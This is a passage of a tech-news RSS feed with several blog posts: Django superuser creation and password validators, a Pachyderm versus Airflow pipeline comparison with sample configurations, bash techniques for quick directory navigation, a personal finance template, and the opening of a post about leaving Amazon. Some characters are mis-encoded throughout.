<div><div><pre><code><span>1.</span> <span>createsuperuser</span><span>.</span><span>py</span>
<span>2.</span> <span>changepassword</span><span>.</span><span>py</span>
</code></pre></div></div>
<h2 id="the-changepassword-command">The changepassword command</h2><p>
Since I had never used/ heard about the <code>changepassword</code> command, I thought of trying it first and to my great pleasure, it worked. You have to pass the username as the first argument.</p>
<div><div><pre><code><span>python</span> <span>manage</span><span>.</span><span>py</span> <span>changepassword</span> <span>username</span>
</code></pre></div></div>
<p><img data-src="https://i.ibb.co/YRfMkYW/Screenshot-2020-09-19-at-3-10-09-AM.png" alt="python manage.py changepassword" title="python manage.py changepassword" src="https://i.ibb.co/YRfMkYW/Screenshot-2020-09-19-at-3-10-09-AM.png">
</p><p>
Sometimes you find gold when you read the code, right? √∞≈∏ÀúÔøΩ</p><p>
Now let√¢‚Ç¨‚Ñ¢s get back to the business and look into the <code>createsuperuser</code> command class in more detail.</p>
<h2 id="fetching-the-correct-database">Fetching the correct database</h2><p>
If you have been using Django for some time, you would know that Django allows you to change a lot of things depending upon the settings you define.</p><p>
This also includes using some random model as your base User model. This is the first thing that the superuser creation <code>__init__</code> constructor method checks for.</p>
<h2 id="creating-the-superuser-without-interaction">Creating the superuser without interaction</h2><p>
You can use a version of the command that allows you to create the superuser without any interaction.</p>
<div><div><pre><code><span>python</span> <span>manage</span><span>.</span><span>py</span> <span>createsuperuser</span> <span>--</span><span>username</span> <span>ranvir</span> <span>--</span><span>email</span> <span>abc</span><span>@</span><span>abc</span><span>.</span><span>com</span> <span>--</span><span>no</span><span>-</span><span>input</span>
</code></pre></div></div>
<p><img data-src="https://i.ibb.co/LJtHHq5/Screenshot-2020-09-19-at-3-17-49-AM.png" alt="python manage.py createsuperuser no-input" title="python manage.py createsuperuser no-input" src="https://i.ibb.co/LJtHHq5/Screenshot-2020-09-19-at-3-17-49-AM.png">
</p><p>
Although the user created using this process will have no password. We can create the password either using the <code>changepassword</code> command or the admin panel.</p>
<h2 id="required-fields-and-interactive-mode">Required fields and interactive mode</h2><p>
For the default <code>User</code> model, <code>email</code> is the only required field but you can change that by changing your <code>REQUIRED_FIELD</code> setting as well.</p><p>
In the interactive mode( which is the default mode as well), the first thing that the prompt asks you to fill, is the username.</p><p>
Django tries to smartly suggest the current system username as the default username. (Just Wow)</p>
<p><img data-src="https://i.ibb.co/pr1Z1Qw/Screenshot-2020-09-19-at-2-14-46-AM.png" alt="django suggest the current system username" title="django suggest the current system username" src="https://i.ibb.co/pr1Z1Qw/Screenshot-2020-09-19-at-2-14-46-AM.png">
</p><p>
It won√¢‚Ç¨‚Ñ¢t suggest the system username if it is already taken. (That√¢‚Ç¨‚Ñ¢s AI for me √∞≈∏Àú‚Äö)</p>
<p><img data-src="https://i.ibb.co/r3YxbKL/Screenshot-2020-09-19-at-2-15-41-AM.png" alt="django doens't suggest the current system username if already taken" title="django doens't suggest the current system username if already taken" src="https://i.ibb.co/r3YxbKL/Screenshot-2020-09-19-at-2-15-41-AM.png">
</p><p>
After the username, you have to fill in the required field which is the email field for the default User model.</p><p>
Finally, you have to fill in the password field.</p>
<h2 id="the-validate-password-method">The validate password method</h2><p>
Sorry for keeping you waiting this long before jumping onto the real reason behind the post.</p><p>
The <code>validatepassword</code> is the function that is used to validate the password provided by the user.</p><p>
Again, we can configure all these validators as well, if these different password validation doesn√¢‚Ç¨‚Ñ¢t work for you, go forward and remove the classes from your settings file.</p><p>
These are the default validators.</p>
<div><div><pre><code><span>AUTH_PASSWORD_VALIDATORS</span> <span>=</span> <span>[</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.UserAttributeSimilarityValidator'</span><span>,</span>
    <span>},</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.MinimumLengthValidator'</span><span>,</span>
    <span>},</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.CommonPasswordValidator'</span><span>,</span>
    <span>},</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.NumericPasswordValidator'</span><span>,</span>
    <span>},</span>
<span>]</span>
</code></pre></div></div><p>
If we use the default validators, then the password,</p>
<ol>
<li>Should not be similar to <code>username</code>, <code>first_name</code>, <code>last_name</code> and <code>email</code>. It also checks for the similarity using <a href="https://docs.python.org/2.4/lib/sequence-matcher.html">SequenceMatcher</a>. It should be less than 0.7 similar which you can customize. (Told you, it√¢‚Ç¨‚Ñ¢s AI)</li>
<li>Should be greater than 8 characters.</li>
<li>Should not be in the list of common passwords. The list of common passwords is in the file, <code>common-passwords.txt.gz</code>. It contains a list of around 20000 common passwords which you should not use.</li>
<li>Should not contain all numeric characters.</li>
</ol><p>
I would suggest keeping the basic configuration intact for the password handling. You can use your own validations on top of it as well.</p><p>
So, that√¢‚Ç¨‚Ñ¢s it for this time. Till next time.</p>
</div></div>]]>
            </description>
            <link>https://ranvir.xyz/blog/how-does-django-validate-passwords/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529740</guid>
            <pubDate>Sat, 19 Sep 2020 19:11:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pachyderm vs. Airflow]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529683">thread link</a>) | @ishcheklein
<br/>
September 19, 2020 | https://szeitlin.github.io/posts/engineering/pachyderm-vs-airflow/ | <a href="https://web.archive.org/web/*/https://szeitlin.github.io/posts/engineering/pachyderm-vs-airflow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

<p>If you do a lot of data pipelining, you‚Äôve probably heard a lot about Airflow by now. I gave a talk
about it a while back at a meetup, and wrote a blog post about it. The gist of my pitch for Airflow
was essentially <em>‚ÄúLook, it‚Äôs so much better than cron.‚Äù</em></p>

<p>Fast-forward a year or two, and my team is using Pachyderm now. This post is about why I wanted to try Pachyderm,
what I love about it, some things that can be improved about it, and some of the tricks you‚Äôll need to know if you want to start using it.</p>

<p><em>Note: I am not in any way being paid by Pachyderm.</em></p>

<hr>



<ul>
<li><p>Designed for a machine learning model workflow, but can also handle regular data pipelining
(including cron-style scheduling). This is incredibly reassuring to me, because Airflow is kind of the other way around.</p></li>

<li><p>Scalability (parallelization support). I haven‚Äôt done much with this yet, but it‚Äôs also reassuring to know it‚Äôs there,
since we‚Äôre a rapidly growing company, and I‚Äôm sure our data needs are going to continue to expand.</p></li>

<li><p>Data and code provenance tracking are built-in.</p></li>
</ul>

<p><em>What that means:</em> It‚Äôs easy to figure out what version
 of your code was running at any given time, and on what data. This is critical if you‚Äôre iterating on
 code for ETL processes or models, or tracking a model that‚Äôs going to evolve over time based on what data it has seen.</p>

<ul>
<li>The egress feature and built-in feed-forward are amazingly elegant.<br></li>
</ul>

<p>Feed-forward (I don‚Äôt know what they call it, that‚Äôs just what I call it) means
you can have one pipeline read from the output of another, and trigger off of that directly.</p>

<p>In Airflow, for comparison, you had to configure this with messaging and it was kind of clunky
(and originally there was no push, only pull, so you were always polling for <em>is that thing done yet?</em>).</p>

<p>In Pachyderm, it‚Äôs an extremely simple configuration.</p>

<p>Egress means you don‚Äôt have to write a plugin to do something as basic as push your data to s3. Pachyderm already
knows how to do that for you (see below for an example of how this is specified in a pipeline).</p>

<p>There‚Äôs also an easy way to tell it to re-process as much data as you want (*except for cron inputs, but they‚Äôre
going to fix that).</p>

<ul>
<li>Not having to clean up the fallout from runaway backfills</li>
</ul>

<p>Runaway backfill in Airflow made our server fall down more than once whenever anybody
forgot to update the start date or name of their DAG. This was a built-in default setting that we couldn‚Äôt change,
where Airflow would try to backfill any missing data to the beginning of time
(1970, of course), and celery would get overloaded.</p>

<p>We tried numerous approaches to make it impossible to do this
by accident, including having tests for checking that the start_date for a revised DAG
was always after the date of the latest changes.</p>

<p>It was the bane of my Airflow existence. Clearing the celery cache
and getting it to restart, and then backfill what we <em>actually</em> wanted was always a time-consuming process, including
kicking the web server again and getting everything back online.</p>

<ul>
<li>Smart re-tries by default (and this is configurable).</li>
</ul>

<p>Having retries at all was a big advantage of Airflow over basic cron, especially since it‚Äôs modular, so you can
have different re-try settings for each step of an ETL pipeline.</p>

<p>Having said that, this was a also kind of a pain to deal with in Airflow, because
if somebody set a ridiculous number of retries, or a backfill job was failing,
it could easily become a blocker for unrelated pipelines just by
gunking up the celery queue with tons of re-tries for something that was
 already failing (see above re: runaway backfill).</p>

<p>With Airflow, we were always having to guess about how many
retries to do, and how much back-off to add in between tries.</p>

<p>Pachyderm‚Äôs defaults for this are completely reasonable
(3 retries, with increasing delay in between each try).</p>

<p>If you get the enterprise version (which is cheap for an enterprise product):</p>

<ul>
<li><p>It‚Äôs more secure than Airflow, with built-in encryption (There‚Äôs also no risk of exposing
passwords by printing all the logs to a webpage that anyone can see, the way Airflow did by default.)</p></li>

<li><p>Really responsive and smart team, and a growing community of users</p></li>

<li><p>Nice dashboard to go with the CLI tool</p></li>

<li><p>Finally, if you don‚Äôt like writing DAGs in Airflow, and are considering one of the myriad (!) new tools
to simplify that for you, this is even simpler than that. (And in my opinion, makes a lot more sense.)</p></li>
</ul>

<p>And here‚Äôs an example of a full ETL process with 3 pipeline steps:</p>

<p><strong>1. Get the data from an api</strong></p>

<pre><code>{
    "pipeline": {
       "name": "api_to_s3_pipeline"
    },

    "transform": {
       "cmd": ["python3", "get_requests.py"],
       "image": "pathto.ecr.region.aws.com/mydockerregistry:my_api_image_v1",
       "image_pull_secrets": ["regcred"]
    },
    "input":{
        "cron": {
            "name": "api_daily_job",
            "spec": "16 6 * * *",
            "repo": "api_to_s3"
         }
    },
    "egress": {"URL": "s3://mys3bucket/"},
    "enable_stats": true,
    "job_timeout": 10m
}
</code></pre>

<p><strong>2. Process the data with pyspark on kubernetes</strong></p>

<pre><code>{
    "pipeline": {
       "name": "pyspark_pipeline"
    },

    "transform": {
       "cmd": ["python3", "pyspark_processsing.py"],
       "image": "pathto.ecr.region.aws.com/mydockerregistry:my_pyspark_image_v1",
       "image_pull_secrets": ["regcred"]
    },
    "input":{
        "atom": {
            "name": "pyspark_daily_job",
            "repo": "pyspark_daily_job",
            "glob: "/*/*/*/"
         }
    },
    "egress": {"URL": "s3://my-pyspark-bucket/"},
    "enable_stats": true,
    "job_timeout": 120m
}
</code></pre>

<p><strong>3. Load the data to Redshift</strong></p>

<pre><code>{
    "pipeline": {
       "name": "load_to_redshift_pipeline"
    },

    "transform": {
       "cmd": ["python3", "load_to_redshift.py"],
       "image": "pathto.ecr.region.aws.com/mydockerregistry:my_psycopg2_image_v1",
       "image_pull_secrets": ["regcred"]
    },
    "input":{
        "atom": {
            "name": "daily_load_job",
            "repo": "daily_load_job",
            "glob: "daily_*.gz"
         }
    },
    "enable_stats": true,
    "job_timeout": 125m
}
</code></pre>

<p>Also, they just got Series A funding, so they‚Äôre going to be around for a while.</p>

<hr>



<p>This was my first time using kubernetes, never mind suddenly being in charge of it (!).</p>

<p>Fair warning: Minikube is deceptively easy to set up and use for very basic testing. If this is all you do with
kubernetes, you‚Äôll think Kubernetes very simple.</p>

<p>Kubernetes itself
isn‚Äôt that hard to deploy if you know what needs to be configured, but I really didn‚Äôt
know any of that when I started. I ran into some weird issues where the kubernetes control script
<code>kubectl</code> didn‚Äôt set the permissions correctly on some of the config files. (Shoutout to Sean Jezewski for helping me
troubleshoot unintuitive stuff like that.)</p>

<p>In case you‚Äôre wondering, as did almost everyone I spoke to while I was doing this,
EKS on AWS is not really ready for prime-time yet.</p>

<p>I ended up relying on a script that the Pachyderm guys wrote to deploy Kubernetes
directly on EC2, and just adapted that for our needs.</p>

<p>Things that are great about deploying in the cloud:</p>

<ul>
<li><p>Encapsulation is your friend. It‚Äôs so much easier when you have complete control of the environment, and there‚Äôs no mystery
about what packages are available or what the paths are.</p></li>

<li><p>Scaling becomes relatively easy. Just split your data and run more jobs in parallel.</p></li>
</ul>

<p>Things to remember about deploying in the cloud:</p>

<ul>
<li><p>Logging is your friend. You won‚Äôt be able to debug with print statements on a remote, headless machine. Some of my
teammates didn‚Äôt quite understand this until they actually did it. Good logging makes it trivially easy to figure out what went wrong.</p></li>

<li><p>Versioning is your friend. Kubernetes won‚Äôt pull the container unless it knows it needs to, so you have to keep renaming your container
if you want to test changes. It‚Äôs kind of a pain, but it‚Äôs simple enough to
just make it part of the workflow (and our next step is to have Jenkins do this for us as part of our
CICD workflow).</p></li>

<li><p>Having to rebuild the container and version it and push it up each time does a couple of things:</p></li>
</ul>

<p>a) Testing is even more important. It‚Äôs a lot nicer if you can do enough testing that after a few bug fixes you‚Äôre on version 4, rather than
(as one of my early pipelines is) version 16.</p>

<p>b) It can be a little bit more annoying to push bug fixes/updates (especially without a CICD system
to build and deploy the containers for you)</p>

<hr>



<ul>
<li>People steered us away from EKS, so then setting up our own kubernetes cluster without a
devops person (!) was challenging, mostly because of</li>

<li><p>AWS permissions issues, including but not limited to:</p>

<p>a) giving the cluster the ability to run queries on the RDS database in the same account</p>

<p>b) creating a separate VPC for Redshift so I could create a peering connection for that (see separate post)</p>

<p>c) giving the cluster the ability to access s3 buckets</p>

<p>d) giving my team access to the docker registries on ECS</p>

<p>e) stupid things like legacy s3 bucket region restrictions that are (or should be?)
going away any minute now(?), but EC2 still cares about, which generate completely
uninformative AccessDenied errors</p></li>

<li><p>Figuring out the workflow for deploying and debugging. This was a little weird at first, but once I got the hang of it,
actually very easy (more on that below)</p></li>

<li><p>Setting up a docker registry and using that (and we don‚Äôt have Jenkins handling that for us yet)</p></li>

<li><p>Managing two clusters on two separate accounts, and switching between them (learning in hard mode is not
always twice as fun as just learning!)</p></li>

<li><p>There is a built-in outlet to connect Pachyderm up with Prometheus, but no built-in monitoring means we‚Äôre doing it downstream
(i.e with automated email alerts sent from Looker if something fails) or manually checking via the
CLI or dashboard view. I have been using the CLI thus far, but now that we have more than a few pipelines
going on one cluster, the dashboard is starting to make more sense.</p></li>

<li><p>Understanding how the ‚Ä¶</p></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://szeitlin.github.io/posts/engineering/pachyderm-vs-airflow/">https://szeitlin.github.io/posts/engineering/pachyderm-vs-airflow/</a></em></p>]]>
            </description>
            <link>https://szeitlin.github.io/posts/engineering/pachyderm-vs-airflow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529683</guid>
            <pubDate>Sat, 19 Sep 2020 19:02:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On fast navigation in the command line]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529677">thread link</a>) | @kkoncevicius
<br/>
September 19, 2020 | http://karolis.koncevicius.lt/posts/fast_navigation_in_terminal_coming_full_cirlce/ | <a href="https://web.archive.org/web/*/http://karolis.koncevicius.lt/posts/fast_navigation_in_terminal_coming_full_cirlce/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">




<p>A small list of methods for fast file system navigation from the command line.
While I tried all of them and finally settled on a minimal approach described at the end, the article doesn‚Äôt advocate for one method over the others.
Different users have different needs and should choose the approach most suitable in their circumstances.</p>

<h2 id="spring">Spring</h2>

<p>At the beginning, just after learning to use the command line, my terminal navigation included a lot of <code>cd</code> and a lot of <code>ls</code>.
I jumped around folders, learned shortcuts like, <code>cd ~</code>, <code>cd -</code>, and started becoming familiar with the shell.
Having multi-argument commands for quick file manipulation felt powerful and fresh, or so I remember.</p>

<p>After going to command line you no longer have to open folders in a graphical window manager, scan their names, use <code>&lt;ctrl + mouse click&gt;</code> to select them, and then drag the mouse to move those selected folders to another place.
You do <code>'mv pattern* place/'</code> instead.
All is nice.</p>

<p>But there was one problem.</p>

<h2 id="summer">Summer</h2>

<p>Along the way I started organizing my folders using a structure like this:</p>

<pre><code>‚îî‚îÄ‚îÄ work
    ‚îú‚îÄ‚îÄ bitbucket
    ‚îÇ   ‚îî‚îÄ‚îÄ user1
    ‚îÇ       ‚îú‚îÄ‚îÄ repo1
    ‚îÇ       ‚îî‚îÄ‚îÄ repo2
    ‚îú‚îÄ‚îÄ github
    ‚îÇ   ‚îú‚îÄ‚îÄ user1
    ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ repo1
    ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ repo2
    ‚îÇ   ‚îú‚îÄ‚îÄ user2
    ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ repo1
    ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ repo2
    ‚îÇ   ‚îú‚îÄ‚îÄ user3
    ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ repo1
    ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ repo2
    ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ repo3
    ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ repo4
    ‚îÇ   ‚îî‚îÄ‚îÄ user4
    ‚îÇ       ‚îî‚îÄ‚îÄ repo1
    ‚îú‚îÄ‚îÄ teaching
    ‚îÇ   ‚îú‚îÄ‚îÄ class1
    ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ lecture1
    ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ lecture2
    ‚îÇ   ‚îî‚îÄ‚îÄ class2
    ‚îÇ       ‚îú‚îÄ‚îÄ lecture1
    ‚îÇ       ‚îî‚îÄ‚îÄ lecture2
    ‚îú‚îÄ‚îÄ‚îÄ clients
    ‚îÇ   ‚îú‚îÄ‚îÄ client1
    ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ project1
    ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ project2
    ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ project3
    ‚îÇ   ‚îú‚îÄ‚îÄ client2
    ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ project1
    ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ project2
    ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ project3
    ‚îÇ   ‚îî‚îÄ‚îÄ client3
    ‚îÇ      ‚îî‚îÄ‚îÄ project1
    ‚îî‚îÄ‚îÄ‚îÄ ...
</code></pre>

<p>I often had to go in and out of various project folders and my <code>cd</code> + <code>ls</code> navigation became tedious.
Reaching a project involved navigating a big tree of directories.
On top of that a lot of directories had similar names which got in the way of tab completion.
This is where I found ‚Äúz‚Äù - a command line utility that tracks your most visited folders based on frequency and recency<a href="#fn:1" id="fnref:1" title="see footnote"><sup>‚ó¶</sup></a>.</p>

<p>‚Äúz‚Äù keeps a database of your most frequently used folders and allows to quickly jump to these folders even if you don‚Äôt remember their full name.
Instead of doing a lot of <code>cd</code> + <code>&lt;tab&gt;</code> all you have to do is type <code>'z proj'</code> and <code>z</code> will take you to your most frequently/recently accessed folder that has <code>proj</code> somewhere in its name.
It takes a short amount of time for ‚Äúz‚Äù to learn about your most visited places but after that it becomes quick and convenient.</p>

<p>But there was one problem.</p>

<h2 id="autumn">Autumn</h2>

<p>‚Äúz‚Äù didn‚Äôt always take me where I wanted to be.
It worked, I would say, around 95% of the time or more.
But those other times it took me to an unrelated directory and distracted from the work at hand forcing to navigate my way back using the old <code>cd</code>.
Moreover, sometimes I moved and renamed various folders which likely contributed to its disorientation.</p>

<p>After this experience I decided that the terminal should be dumb and deterministic without any fuzziness or smart guessing.
And here I found <code>marks</code> - a short and sweet command line script for keeping manual directory bookmarks.<a href="#fn:2" id="fnref:2" title="see footnote"><sup>‚ó¶</sup></a>
It consisted of 4 tiny functions: one for creating a mark, one for removing, one for listing all the marks, and one for jumping to the bookmarked folder:</p>

<pre><code>export MARKPATH=$HOME/.marks

function mark {
  mkdir -p "$MARKPATH"; ln -s "$(pwd)" "$MARKPATH/$1"
}

function unmark {
  rm -i "$MARKPATH/$1"
}

function marks {
  ls -l "$MARKPATH" | sed 's/  / /g' | cut -d' ' -f9- | sed 's/ -/\t-/g' &amp;&amp; echo
}

function jump {
  cd -P "$MARKPATH/$1" 2&gt;/dev/null || echo "No such mark: $1"
}
</code></pre>

<p>As well as a function generating completion suggestions after pressing <code>&lt;tab&gt;</code>:</p>

<pre><code>_completemarks() {
  local curw=${COMP_WORDS[COMP_CWORD]}
  local wordlist=$(find $MARKPATH -type l -printf "%f\n")
    COMPREPLY=($(compgen -W '${wordlist[@]}' -- "$curw"))
    return 0
}

complete -F _completemarks jump unmark
</code></pre>

<p>The workflow of marks is manual but convenient.
You have to go into the directory you want to bookmark and execute the <code>mark</code> command followed by the custom name, like <code>'mark myproject'</code>.
After that you can quickly jump back to this bookmarked folder using <code>'jump myproject'</code> and when the bookmark is no longer relevant you can get rid of it with <code>'unmark myproject'</code>.</p>

<p>With this approach the user is in control.
There is no secret smart behaviour which means no auto-magic and no surprises.
And after moving a project to another place the bookmark can be easily adjusted to point to its new location immediately, without waiting for a hidden automatic process to update its location, frequency, and recency.</p>

<p>But there was one problem.</p>

<h2 id="winter">Winter</h2>

<p>Neither of those <code>jump</code> nor <code>z</code> commands could take me everywhere I needed to go.
So the typical workflow would start with jumping to a project via the <code>jump</code> command but then switching to the old navigation via <code>cd</code> once inside it.
Which meant that for navigating the file system I always had to keep using both: <code>jump</code> and <code>cd</code>.
And having two distinct commands for doing the same thing felt a bit weird.
This is where I learned about the <code>$CDPATH</code><a href="#fn:3" id="fnref:3" title="see footnote"><sup>‚ó¶</sup></a> variable and rolled out my own solution.</p>

<p>All you have to do is add this to your .bashrc:</p>

<pre><code>export CDPATH=.:~/.marks/
</code></pre>

<p>Then, to add a bookmark called <code>@name</code> pointing to a <code>"dir"</code> directory:</p>

<pre><code>ln -sr dir ~/.marks/@name
</code></pre>

<p>To delete a bookmark:</p>

<pre><code>rm ~/.marks/@name
</code></pre>

<p>To jump to its location:</p>

<pre><code>cd @name
</code></pre>

<p>And to list all available bookmarks:</p>

<pre><code>cd @&lt;tab&gt;
</code></pre>

<p>The <code>$CDPATH</code> solution works best when all the bookmarks are started with a special symbol which in my case was <code>@</code>.
This solves a couple of problems.
One, the bookmarked directories, if prefixed with <code>@</code> symbol, will not interfere with directories in the current folder.
Second, all the available bookmarks will be displayed by typing <code>'cd @&lt;tab&gt;'</code>.
And third, all bookmarks are now part of <code>cd</code> and so they gain tab completion for free.
You can even use tab completion for jumping directly to folders nested within bookmarks by doing <code>'cd @bookmark/subfolder/'</code>.</p>

<p>Using this method you no longer have to maintain a short list of custom bookmark functions and their autocompletion in your .bashrc.
And command for ‚Äúchange directory‚Äù can always be done with the same old and familiar <code>cd</code> command, independant of context.</p>

<p>But there was one problem.</p>

<h2 id="springagain">Spring again</h2>

<p>After working with the <code>$CDPATH</code> approach for a while I began noticing something peculiar.
At no point in time did I have a list with a dozen or more bookmarks.
Instead I found myself constantly going to the same 2 or 3 projects, finishing them, removing them from <code>~/.marks/</code> folder, adding new ones, and repeating the cycle again.
Why would someone keep bookmarks for 3 directories?</p>

<p>This time, instead of changing the command, I tried to do something different and changed the folder structure.
My projects moved from the state of being relevant to being archived so why not create an archive directory and organize folders based not on their name or type but on state?
Thus the <code>"zzz"</code> folder was born.
And now my project structure looks something like this:</p>

<pre><code>‚îî‚îÄ‚îÄ work
    ‚îú‚îÄ‚îÄ active_project1
    ‚îú‚îÄ‚îÄ active_project2
    ‚îî‚îÄ‚îÄ zzz
        ‚îú‚îÄ‚îÄ bitbucket
        ‚îÇ   ‚îî‚îÄ‚îÄ user1
        ‚îÇ       ‚îú‚îÄ‚îÄ repo1
        ‚îÇ       ‚îî‚îÄ‚îÄ repo2
        ‚îú‚îÄ‚îÄ github
        ‚îÇ   ‚îú‚îÄ‚îÄ user1
        ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ repo1
        ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ repo2
        ‚îÇ   ‚îú‚îÄ‚îÄ user2
        ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ repo1
        ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ repo2
        ‚îÇ   ‚îú‚îÄ‚îÄ user3
        ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ repo1
        ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ repo2
        ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ repo3
        ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ repo4
        ‚îÇ   ‚îî‚îÄ‚îÄ user4
        ‚îÇ       ‚îî‚îÄ‚îÄ repo1
        ‚îú‚îÄ‚îÄ teaching
        ‚îÇ   ‚îú‚îÄ‚îÄ class1
        ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ lecture1
        ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ lecture2
        ‚îÇ   ‚îî‚îÄ‚îÄ class2
        ‚îÇ       ‚îú‚îÄ‚îÄ lecture1
        ‚îÇ       ‚îî‚îÄ‚îÄ lecture2
        ‚îú‚îÄ‚îÄ‚îÄ clients
        ‚îÇ   ‚îú‚îÄ‚îÄ client1
        ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ project1
        ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ project2
        ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ project3
        ‚îÇ   ‚îú‚îÄ‚îÄ client2
        ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ project1
        ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ project2
        ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ project3
        ‚îÇ   ‚îî‚îÄ‚îÄ client3
        ‚îÇ      ‚îî‚îÄ‚îÄ project1
        ‚îî‚îÄ‚îÄ‚îÄ ...
</code></pre>

<p>With this structure the bookmarking systems no longer provide big benefits as most frequent and recent folders are always under ~/work/some_project.
And since at any timepoint only a few of them are visible the tab completion will do its job: <code>'cd ~/w&lt;tab&gt;/s&lt;tab&gt;'</code>.</p>

<p>The name <code>"zzz"</code> might seem strange but is convenient: the letters ‚Äúzzz‚Äù symbolically mark the projects within as being in a ‚Äúsleeping‚Äù state while the 3 ‚Äúz‚Äù letters in a row make sure that this folder is always placed at the very end of your active project list.
A nice folder structure is still maintained in the archive but for the ease of access all active folders are layed flat under the <code>~/work/</code> directory.
When the project is paused or completed it is moved to its place within the <code>"zzz"</code> hierarchy, maintaining the previous structure.
There is one extra benefit - contents of the <code>"work"</code> directory act as a reminder about all the projects that are in progress.
If necessary a to-do list with concrete details might be placed at the same level.</p>

<p>And just like that, like a newbie, I navigate the file system with <code>cd</code> and <code>ls</code> again.</p>






</div>]]>
            </description>
            <link>http://karolis.koncevicius.lt/posts/fast_navigation_in_terminal_coming_full_cirlce/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529677</guid>
            <pubDate>Sat, 19 Sep 2020 19:00:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Financial Status Template]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24529631">thread link</a>) | @jrdi
<br/>
September 19, 2020 | https://jordivillar.com/financial-status/ | <a href="https://web.archive.org/web/*/https://jordivillar.com/financial-status/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2><a href="https://bit.ly/2Fm374g">The Financial Status Template</a><svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M16.5 13V18.5H6.5V8.5H12" stroke="#4A5568"></path> <path d="M10 15L18.5 6.5" stroke="#4A5568"></path> <path d="M14 6.5H18.5V11" stroke="#4A5568"></path></svg></h2><h3>How to stay on top of your personal finances.</h3><p>Staying on top of your <stron>personal finances</stron> can be challenging, tedious, and even discouraging, but for most people this process is a necessary evil. Spending more than you earn is a sure way to bury yourself in debt, and not being careful about precisely where <strong>your money is going</strong> can leave you struggling to pay for the day-to-day necessites.</p><p>During the last year, I have been <strong>tracking my personal finances</strong> on a monthly basis. Nothing too complicated but useful with <strong>insightful visualizations</strong>, allowing you to evaluate your financial status at-a-glance.</p><figure><a href="https://bit.ly/2Fm374g"><img src="https://i.ibb.co/1sRmTpJ/Screenshot-2020-09-19-at-13-43-31.png" alt="The Financial Status Template"></a></figure><p>I share similar personal finances insights in Twitter, you can <a href="https://twitter.com/jrdi">follow me there</a> as I continue to document my journey.</p></div></div></div>]]>
            </description>
            <link>https://jordivillar.com/financial-status/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529631</guid>
            <pubDate>Sat, 19 Sep 2020 18:51:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I Quit a $500K Job at Amazon to Work for Myself (2019)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24529590">thread link</a>) | @jkchu
<br/>
September 19, 2020 | https://danielvassallo.com/only-intrinsic-motivation-lasts/ | <a href="https://web.archive.org/web/*/https://danielvassallo.com/only-intrinsic-motivation-lasts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-92">
			<!-- .entry-header -->
	<div>
		
<h2>Why I Quit a $500K Job at Amazon to Work for Myself</h2>



<p>Last week I left my cushy job at Amazon after 8 years. Despite getting rewarded repeatedly with promotions, compensation, recognition, and praise, I wasn‚Äôt motivated enough to do another year.</p>



<p>I spent my entire time in AWS building tools for developers. I liked that field so much that I would have been satisfied working in it for the rest of my life.</p>



